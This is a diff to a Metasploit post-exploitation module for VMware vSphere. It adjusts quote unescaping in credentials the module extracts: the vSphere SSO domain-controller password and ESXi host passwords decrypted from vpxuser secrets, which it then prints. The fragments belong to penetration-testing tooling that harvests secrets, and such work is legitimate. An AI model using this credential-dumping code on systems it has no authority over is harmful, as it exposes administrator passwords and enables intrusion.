@@ -135,9 +135,9 @@ class MetasploitModule < Msf::Post
       fail_with(Msf::Exploit::Failure::Unknown, 'Could not determine vmdir dcAccountPassword from lwregshell')
     end
 
-    @bind_pw = @bind_pw[1..@bind_pw.length - 2]
+    @bind_pw = @bind_pw[1..@bind_pw.length - 2].gsub('\"', '"')
     print_good("vSphere SSO DC PW: #{@bind_pw}")
-    @shell_bind_pw = "'#{@bind_pw.gsub('\"', '"').gsub("'") { "\\'" }}'"
+    @shell_bind_pw = "'#{@bind_pw.gsub("'") { "\\'" }}'"
 
     extra_service_data = {
       address: Rex::Socket.getaddress(rhost),
@@ -720,7 +720,7 @@ class MetasploitModule < Msf::Post
       esxi_user = row_data[2]
 
       vpxuser_secret_b64 = row_data[3].gsub('*', '')
-      esxi_pass = vpx_aes_decrypt(vpxuser_secret_b64)
+      esxi_pass = vpx_aes_decrypt(vpxuser_secret_b64).gsub('\"', '"')
 
       print_good("ESXi Host #{esxi_fqdn} [#{esxi_ipv4}]\t LOGIN: #{esxi_user} PASS: #{esxi_pass}")
 
